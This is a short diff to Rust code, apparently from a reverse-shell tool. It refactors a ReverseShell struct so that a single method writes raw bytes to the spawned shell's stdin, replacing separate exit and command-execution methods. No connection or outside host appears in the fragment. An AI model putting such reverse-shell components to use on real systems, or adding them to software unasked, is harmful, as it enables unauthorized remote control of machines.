@@ -66,19 +66,10 @@ impl ReverseShell {
         }
     }
 
-    pub fn exit_shell(&mut self) {
+    pub fn send_shell_command(&mut self, command: &[u8]) {
         if let Some(shell) = self.reverse_shell.as_mut() {
             if let Some(stdin) = shell.stdin.as_mut() {
-                let _ = stdin.write_all(b"exit\n");
-                let _ = stdin.flush();
-            }
-        }
-    }
-
-    pub fn execute_shell_command(&mut self, command: &str) {
-        if let Some(shell) = self.reverse_shell.as_mut() {
-            if let Some(stdin) = shell.stdin.as_mut() {
-                let _ = stdin.write_all(format!("{}\n", command).as_bytes());
+                let _ = stdin.write_all(command);
                 let _ = stdin.flush();
             }
         }
